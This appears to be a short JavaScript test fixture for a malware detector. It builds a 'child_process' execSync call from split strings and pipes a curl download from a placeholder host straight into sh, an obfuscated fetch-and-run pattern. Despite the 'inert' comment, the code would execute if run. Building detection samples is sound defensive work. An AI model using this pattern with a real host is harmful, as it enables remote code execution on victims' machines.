// FIXTURE ONLY — synthetic detection test sample, not real malware
// Inert sample: the command is split across string literals.
const cp = require('child_' + 'process');
cp['ex' + 'ecSync']('cu' + 'rl -s https://stage.example.invalid/i.sh | s' + 'h');
